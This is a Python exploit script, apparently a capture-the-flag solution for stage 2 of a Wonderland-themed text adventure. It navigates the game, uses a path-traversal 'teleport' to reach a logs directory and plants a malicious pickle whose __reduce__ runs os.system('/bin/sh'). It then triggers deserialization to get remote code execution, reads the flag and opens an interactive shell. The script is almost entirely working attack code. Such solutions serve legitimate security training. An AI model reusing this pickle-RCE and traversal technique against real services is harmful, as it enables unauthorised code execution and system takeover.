#!/usr/bin/env python

'''
1865 Text Adventure
Solution for Stage 2

'''

from pwn import *
from common import Common
from urllib.request import quote

import pickle
import dill
import os
import uuid


class Exploit:
    '''Spawns a /bin/bash shell when deserialized.

    Includes some required strings that are checked server-side to determine 'dill-ness'.
    '''

    def __reduce__(self):
        cmd = ('/bin/sh')
        return os.system, (cmd,), {'a': 'dill._dill', 'b': 'rabbithole', 'c': 'on_get'}


def main():
    # Get the connection.
    c = Common.get_connection()
    c.init_connection()

    # Move to the a-shallow-deadend to get the pocket-watch.
    # This pocket-watch allows us to turn off text scrolling.
    log.info('Moving to the a-shallow-deadend to get the pocket-watch...')
    c.move(b'a-shallow-deadend')
    c.get(b'pocket-watch')
    log.info('Disabling text scroll.')
    c.sendline(b'options text_scroll f')
    c.back()

    # Move to the a-curious-hall and drink the pink-bottle.
    log.info('Moving to a-curious-hall to drink the pink-bottle...')
    next_path = [b'deeper-into-the-burrow', b'a-curious-hall', b'a-curious-hall']
    c.multimove(next_path)
    c.get(b'pink-bottle')

    # Move to the a-fancy-pavillion and eat the fluffy-cake.
    log.info('Moving to a-fancy-pavillion to eat the fluffy-cake...')
    next_path = [b'a-pink-door', b'maze-entrance', b'knotted-boughs', b'dazzling-pines',
                 b'a-pause-in-the-trees', b'confusing-knot', b'green-clearing',
                 b'a-fancy-pavillion']
    c.multimove(next_path)
    c.get(b'fluffy-cake')

    # Move to a-mystical-cove to get the looking-glass.
    log.info('Moving to a-mystical-cove to get the looking-glass...')
    next_path = [b'along-the-rolling-waves', b'a-sandy-shore', b'a-mystical-cove']
    c.multimove(next_path)
    c.get(b'looking-glass')

    # Teleport to the location of the golden-hookah.
    log.info('Teleporting to under-a-giant-mushroom to get the golden-hookah...')
    mushroom = ('sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/further-into-'
                'the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom')
    c.sendline('teleport ' + mushroom)
    c.get(b'golden-hookah')

    # Teleport to /opt/wonderland/logs/
    log.info('Teleporting to /opt/wonderland/logs')
    c.sendline(b'teleport ../../../../../../opt/wonderland/logs')
    c.get_until_prompt()

    # Generate the payload and write an item to the logs directory.
    log.info('Generating pickle RCE payload...')
    payload = quote(pickle.dumps(Exploit()), safe='').encode('ascii')
    random_filename = str(uuid.uuid4()).encode('ascii')
    log.info('Writing payload to {}.item'.format(random_filename.decode('ascii')))
    c.sendline(b'blowsmoke ' + random_filename + b'.item ' + payload)
    c.get_until_prompt()

    # Trigger the RCE.
    log.info('Triggering RCE...')
    c.sendline(b'get logs-' + random_filename)
    c.get_until_prompt()
    c.get_until_prompt()

    # Get the flag.
    log.info('Getting the flag by executing /home/rabbit/flag2.bin')
    log.success('Flag 2:')
    c.sendline('/home/rabbit/flag2.bin')
    c.sendline('echo END_OF_FLAG')
    log.success(c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b''))

    # Drop into an interactive shell.
    log.success('Enjoy your shell!')
    c.interactive()


if __name__ == '__main__':
    main()
